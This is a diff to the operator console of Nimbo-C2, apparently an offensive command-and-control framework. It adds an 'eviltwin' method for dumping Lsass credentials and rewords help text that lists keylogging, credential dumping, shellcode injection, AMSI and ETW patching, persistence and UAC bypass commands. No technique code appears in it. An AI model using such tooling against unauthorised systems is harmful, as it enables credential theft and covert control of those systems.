@@ -105,7 +105,8 @@ agent_completer_windows = NestedCompleter.from_nested_dict({
     'lsass': {
         'examine': None,
         'direct': None,
-        'comsvcs': None
+        'comsvcs': None,
+        'eviltwin': None
     },
     'sam': None,
     'shellc': None,
@@ -162,24 +163,24 @@ def exit_nimbo():
 def print_main_help():
     main_help = f"""
     --== Agent ==--
-    agent list                    ->  list active agents
-    agent interact <agent-id>     ->  interact with the agent
-    agent remove <agent-id>       ->  remove agent data
+    agent list                    ->  List active agents
+    agent interact <agent-id>     ->  Interact with the agent
+    agent remove <agent-id>       ->  Remove agent data
     
     --== Builder ==--
-    build exe                     ->  build exe agent (-h for help)
-    build dll                     ->  build dll agent (-h for help)
-    build elf                     ->  build elf agent (-h for help)
+    build exe                     ->  Build EXE agent (-h for help)
+    build dll                     ->  Build DLL agent (-h for help)
+    build elf                     ->  Build ELF agent (-h for help)
 
     --== Listener ==--
-    listener start                ->  start the listener
-    listener stop                 ->  stop the listener
-    listener status               ->  print the listener status
+    listener start                ->  Start the listener
+    listener stop                 ->  Stop the listener
+    listener status               ->  Print the listener status
     
     --== General ==--
-    cls                           ->  clear the screen
-    help                          ->  print this help message
-    exit                          ->  exit Nimbo-C2
+    cls                           ->  Clear the screen
+    help                          ->  Print this help message
+    exit                          ->  Exit Nimbo-C2
     """
 
     print(main_help)
@@ -189,92 +190,93 @@ def print_agent_help(os):
     
     windows_help = f"""
     --== Send Commands ==--
-    cmd <shell-command>                    ->  execute a shell command 
-    iex <powershell-scriptblock>           ->  execute in-memory powershell command
+    cmd <shell-command>                    ->  Execute a shell command 
+    iex <powershell-scriptblock>           ->  Execute in-memory powershell command
     
     --== File Stuff ==--
-    download <remote-file>                 ->  download a file from the agent (wrap path with quotes)
-    upload <local-file> <remote-path>      ->  upload a file to the agent (wrap paths with quotes)
+    download <remote-file>                 ->  Download a file from the agent (wrap path with quotes)
+    upload <local-file> <remote-path>      ->  Upload a file to the agent (wrap paths with quotes)
     
     --== Discovery Stuff ==--
-    pstree                                 ->  show process tree
-    checksec                               ->  enum security products
-    software                               ->  enum installed software
-    windows                                ->  enum visible windows
-    modules                                ->  enum process loaded modules
+    pstree                                 ->  Show process tree
+    checksec                               ->  Enum security products
+    software                               ->  Enum installed software
+    windows                                ->  Enum visible windows
+    modules                                ->  Enum process loaded modules
     
     --== Collection Stuff ==--
-    clipboard                              ->  retrieve clipboard
-    screenshot                             ->  retrieve screenshot
-    audio <record-time>                    ->  record audio
-    keylog start                           ->  start keylogger
-    keylog dump                            ->  retrieve captured keystrokes
-    keylog stop                            ->  retrieve captured keystrokes and stop keylogger
+    clipboard                              ->  Retrieve clipboard
+    screenshot                             ->  Retrieve screenshot
+    audio <record-time>                    ->  Record audio (waits for completion)
+    keylog start                           ->  Start a keylogger in a new thread
+    keylog dump                            ->  Retrieve captured keystrokes
+    keylog stop                            ->  Retrieve captured keystrokes and stop the keylogger
     
     --== Post Exploitation Stuff ==--
-    lsass examine                          ->  examine lsass.exe protections
-    lsass direct                           ->  dump lsass.exe directly (elevation required)
-    lsass comsvcs                          ->  dump lsass.exe using rundll32 and comsvcs.dll (elevation required)
-    sam                                    ->  dump sam,security,system hives using reg.exe (elevation required)
-    shellc <raw-shellcode-file> <pid>      ->  inject shellcode to a remote process using indirect syscalls
-    assembly <local-assembly> <args>       ->  execute .net assembly (pass all args as a single quoted string)
+    lsass examine                          ->  Examine Lsass protections
+    lsass direct                           ->  Dump Lsass directly (elevation required)
+    lsass comsvcs                          ->  Dump Lsass using Rundll32 and Comsvcs.dll (elevation required)
+    lsass eviltwin                         ->  Dump Lsass using the Evil Lsass Twin method (elevation required)
+    sam                                    ->  Dump sam,security,system hives using reg.exe (elevation required)
+    shellc <raw-shellcode-file> <pid>      ->  Inject shellcode to a remote process using indirect syscalls
+    assembly <local-assembly> <args>       ->  Execute inline .NET assembly (pass all args as a single quoted string)
     
     --== Evasion Stuff ==--
-    patch amsi                             ->  patch amsi using indirect syscalls
-    patch etw                              ->  patch etw using indirect syscalls
+    patch amsi                             ->  Patch AMSI using indirect syscalls
+    patch etw                              ->  Patch ETW using indirect syscalls
     
     --== Persistence Stuff ==--
-    persist run <command> <key-name>       ->  set run key (will try first hklm, then hkcu)
-    persist spe <command> <process-name>   ->  persist using silent process exit technique (elevation required)
+    persist run <command> <key-name>       ->  Set run key (will try first HKLM, then HKCU)
+    persist spe <command> <process-name>   ->  Persist using Silent Process Exit technique (elevation required)
     
     --== Privesc Stuff ==--
-    uac fodhelper <command>                ->  elevate session using the fodhelper uac bypass technique
-    uac sdclt <command>                    ->  elevate session using the sdclt uac bypass technique
+    uac fodhelper <command>                ->  Elevate session using the Fodhelper UAC bypass technique
+    uac sdclt <command>                    ->  Elevate session using the Sdclt UAC bypass technique
     
     --== Interaction stuff ==--
-    msgbox <title> <text>                  ->  pop a message box in a new thread
-    speak <text>                           ->  speak using 'sapi.spvoice' com interface
+    msgbox <title> <text>                  ->  Pop a message box in a new thread
+    speak <text>                           ->  Speak a string using the microphone
     
     --== Communication Stuff ==--
-    sleep <sleep-time> <jitter-%>          ->  change sleep time interval and jitter
-    clear                                  ->  clear pending commands
-    collect                                ->  recollect agent data
-    kill                                   ->  kill the agent (persistence will still take place)
+    sleep <sleep-time> <jitter-%>          ->  Change sleep time interval and jitter
+    clear                                  ->  Clear pending commands
+    collect                                ->  Recollect agent data
+    kill                                   ->  Kill the agent (persistence will still take place)
     
     --== General ==--
-    show                                   ->  show agent details
-    back                                   ->  back to main screen
-    cls                                    ->  clear the screen
-    help                                   ->  print this help message
-    exit                                   ->  exit Nimbo-C2
+    show                                   ->  Show agent details
+    back                                   ->  Back to main screen
+    cls                                    ->  Clear the screen
+    help                                   ->  Print this help message
+    exit                                   ->  Exit Nimbo-C2
     """
 
     linux_help = f"""
     --== Send Commands ==--
-    cmd <shell-command>                    ->  execute a terminal command 
+    cmd <shell-command>                    ->  Execute a terminal command 
     
     --== File Stuff ==--
-    download <remote-file>                 ->  download a file from the agent (wrap path with quotes)
-    upload <local-file> <remote-path>      ->  upload a file to the agent (wrap paths with quotes)
+    download <remote-file>                 ->  Download a file from the agent (wrap path with quotes)
+    upload <local-file> <remote-path>      ->  Upload a file to the agent (wrap paths with quotes)
     
     --== Post Exploitation Stuff ==--
-    memfd <mode> <elf-file> <commandline>  ->  load elf in-memory using the memfd_create syscall
-                                               implant mode: load the elf as a child process and return
-                                               task mode: load the elf as a child process, wait on it, and get its output when it's done
+    memfd <mode> <elf-file> <commandline>  ->  Load ELF in-memory using the memfd_create syscall
+                                               implant mode: load the ELF as a child process and return
+                                               task mode: load the ELF as a child process, wait on it, and get its output when it's done
                                                (pass the whole command line as a single quoted string)
     
     --== Communication Stuff ==--
-    sleep <sleep-time> <jitter-%>          ->  change sleep time interval and jitter
-    clear                                  ->  clear pending commands
-    collect                                ->  recollect agent data
-    kill                                   ->  kill the agent (persistence will still take place)
+    sleep <sleep-time> <jitter-%>          ->  Change sleep time interval and jitter
+    clear                                  ->  Clear pending commands
+    collect                                ->  Recollect agent data
+    kill                                   ->  Kill the agent
     
     --== General ==--
-    show                                   ->  show agent details
-    back                                   ->  back to main screen
-    cls                                    ->  clear the screen
-    help                                   ->  print this help message
-    exit                                   ->  exit Nimbo-C2
+    show                                   ->  Show agent details
+    back                                   ->  Back to main screen
+    cls                                    ->  Clear the screen
+    help                                   ->  Print this help message
+    exit                                   ->  Exit Nimbo-C2
     """
     
     if os == "windows":
@@ -391,7 +393,7 @@ def agent_screen_windows(agent_id):
                     "command_type": "lsass-examine",
                 }
 
-            elif re.fullmatch(r"\s*lsass\s+(direct|comsvcs)", command):
+            elif re.fullmatch(r"\s*lsass\s+(direct|comsvcs|eviltwin)", command):
                 dump_method = re.sub(r"\s*lsass\s+", "", command, 1)
                 command_dict = {
                     "command_type": "lsass",
